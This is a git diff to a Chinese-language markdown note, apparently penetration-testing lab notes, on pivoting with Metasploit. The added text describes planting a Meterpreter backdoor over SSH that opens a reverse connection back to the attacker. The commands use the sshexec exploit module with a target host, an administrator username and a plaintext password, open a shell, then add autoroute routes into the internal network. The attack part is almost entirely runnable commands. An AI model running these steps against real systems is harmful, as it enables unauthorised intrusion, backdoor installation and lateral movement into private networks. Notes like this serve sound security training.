@@ -25,6 +25,11 @@ Disable 172.19.19.7
 # MSF
 ![](./MSF.png)
 ```
+做法:
+1. SSH過去SSH Server種Meterpreter後門後會彈一個Reverse Connection回來
+2. Session建立後做Session Routing
+```
+```
 MSF的autoroute模組是MSF框架中自帶的路由轉送功能
 實作是MSF框架在已經取得的Meterpreter Shell的基礎上
 增加一條去往「內網」的路由，直接使用MSF去存取原本不能
@@ -36,7 +41,7 @@ SSH
 msfconsole -q
 # msf
 use exploit/multi/ssh/sshexec
-set lhost 172.19.19.18
+set lhost 192.168.0.18
 set rhosts 172.19.19.70
 set username administrator
 set password Infinit3
@@ -44,11 +49,11 @@ exploit
 # meterpreter
 shell
 ```
-Session-Routing
+**Session-Routing**
 ```bash
 run get_local_subnets
 run post/multi/manage/autoroute OPTION=s
-run autoroute -p
+run autoroute -p  #gateway : Session1
 background
 
 
